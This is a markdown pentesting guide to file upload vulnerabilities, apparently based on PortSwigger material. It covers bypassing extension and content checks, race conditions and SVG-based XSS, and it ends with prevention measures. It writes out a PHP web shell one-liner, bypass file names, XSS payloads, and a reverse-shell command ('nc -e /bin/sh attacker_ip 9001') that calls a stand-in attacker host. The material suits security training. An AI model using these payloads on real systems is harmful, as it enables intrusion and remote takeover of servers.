# File Upload Attacks

[Relative Cheat Sheet](./file-upload-cheat.md)

## Step-by-Step Guide for Testing and Exploiting File Upload Vulnerabilities

### 1. Understand File Upload Vulnerabilities
   - **Explanation**: File upload vulnerabilities occur when applications allow uploading files without proper validation of type, content, or size, potentially leading to remote code execution (RCE) via malicious scripts, client-side attacks like XSS, or denial-of-service (DoS) via resource exhaustion.
   - **Why It's Done**: Understanding the risks (e.g., executing a PHP shell or injecting XSS) helps prioritize testing for high-impact vulnerabilities.
   - **Example**: Uploading `shell.php` with `<?php system($_GET['cmd']); ?>` that executes commands when accessed.

### 2. Identify Upload Features
   - **Explanation**: Locate forms or API endpoints with `<input type="file">` or file upload functionality, such as profile picture uploads or document submissions.
   - **Why It's Done**: These are the entry points for testing; missing them could overlook critical vulnerabilities.
   - **Example**: A user profile page with an avatar upload form.

### 3. Test Unrestricted Uploads
   - **Explanation**: Attempt to upload a malicious file, like a PHP web shell (`<?php system($_REQUEST['cmd']); ?>`), and access it to see if it executes.
   - **Why It's Done**: Lack of validation allows immediate RCE, the highest-impact exploit.
   - **Example**: Upload `shell.php` and access `/uploads/shell.php?cmd=id` to see if `id` command runs.

### 4. Analyze Server File Handling
   - **Explanation**: Determine how the server processes uploaded files—check if it relies on extensions, MIME types, or content inspection, and whether files are executable.
   - **Why It's Done**: Understanding handling (e.g., PHP files executed vs. served as text) informs bypass strategies.
   - **Example**: Upload `test.php` and see if it’s executed or downloaded as plain text.

### 5. Bypass Client-Side Validation
   - **Explanation**: Use a proxy (Burp Suite) or disable JavaScript (DevTools, CTRL+SHIFT+C) to bypass client-side checks on file types or sizes.
   - **Why It's Done**: Client-side validation is easily bypassed, exposing server-side weaknesses.
   - **Example**: Change `image/jpeg` to `application/x-php` in intercepted request.

### 6. Bypass Blacklist-Based Validation
   - **Explanation**: Try uncommon extensions (`phtml`, `php3`), case variations (`pHp`), or double extensions (`shell.php.jpg`) to evade extension blacklists.
   - **Why It's Done**: Blacklists are often incomplete or poorly implemented, allowing malicious files through.
   - **Example**: Upload `shell.phtml` if `.php` is blocked but `.phtml` is not.

### 7. Bypass Whitelist or Content Validation
   - **Explanation**: Use polyglots (files valid as both image and code), null bytes (`shell.php%00.jpg`), or inject characters (`%20`, `%0a`) to trick validation.
   - **Why It's Done**: Whitelists or content checks may miss edge cases, enabling execution.
   - **Example**: Create a JPEG with PHP code in metadata using ExifTool, upload as `image.jpg`.

### 8. Test for Race Conditions
   - **Explanation**: Rapidly upload files to exploit temporary file storage before validation or deletion.
   - **Why It's Done**: Race conditions can allow access to files before they’re removed.
   - **Example**: Fuzz temporary file names like `/tmp/phpXXXXXX` during upload.

### 9. Test Client-Side Attacks
   - **Explanation**: Upload files triggering client-side vulns, like SVG with `<script>alert(1)</script>` for XSS or XML with XXE payloads.
   - **Why It's Done**: If RCE is blocked, client-side attacks still have impact.
   - **Example**: Upload `malicious.svg` with `<svg onload=alert(1)>` and access it.

### 10. Escalate to RCE or Other Impacts
   - **Explanation**: If a file executes, use it for RCE (e.g., reverse shell via `msfvenom -p php/reverse_php`). Chain with LFI for further exploitation.
   - **Why It's Done**: Maximizes impact, turning upload into full system access.
   - **Example**: Upload `shell.php`, access `/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001`, or use FTP (see [FTP Cheat Sheet](./ftp-cheat.md)) to upload via an open server.

### 11. Assess Prevention Measures
   - **Explanation**: Check for strong validation (whitelists, content checks), random file names, or non-executable upload directories.
   - **Why It's Done**: Informs remediation, like storing files outside web root or disabling script execution.
   - **Example**: Secure app renames files to random UUIDs and serves as `Content-Type: application/octet-stream`.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a thorough process for testing file upload vulnerabilities. Test ethically and report responsibly.